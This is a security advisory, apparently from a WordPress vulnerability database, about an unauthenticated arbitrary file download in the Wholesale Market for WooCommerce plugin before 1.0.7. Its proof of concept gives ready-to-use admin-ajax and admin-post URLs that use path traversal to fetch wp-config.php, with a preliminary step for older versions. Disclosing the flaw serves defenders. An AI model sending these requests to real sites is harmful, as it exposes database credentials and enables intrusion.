## WordPress Plugin Vulnerabilities

# Wholesale Market for WooCommerce < 1.0.7 - Unauthenticated Arbitrary File Download

### Description

The plugin does not have authorisation check, as well as does not validate user input used to generate system path, allowing unauthenticated attackers to download arbitrary file from the server.

Note: v1.0.7 added capability check, making the issue still exploitable by high privilege users such as admin (which would be an issue in multisite)

### Proof of Concept

v 1.0.6
If the wholesale\_market\_import\_error folder does not exist, issue is still exploitable as any authenticated user (same URLs as for v < 1.0.6)
If the folder already exist, exploitable as unauthenticated: https://example.com/wp-admin/admin-post.php?action=ced\_cwsm\_csv\_import\_export\_module\_download\_error\_log&tab=ced\_cwsm\_plugin&section=ced\_cwsm\_csv\_import\_export\_module&ced\_cwsm\_log\_download=../../../wp-config.php
v < 1.0.6 (as unauthenticated):
First call https://example.com/wp-admin/admin-ajax.php?action=ced\_cwsm\_csv\_import\_export\_module\_read\_csv which will create the log directory
Then call http://example.com/wp-admin/admin-ajax.php?action=ced\_cwsm\_csv\_import\_export\_module\_download\_error\_log&tab=ced\_cwsm\_plugin&section=ced\_cwsm\_csv\_import\_export\_module&ced\_cwsm\_log\_download=../../../wp-config.php to download the wp-config.php
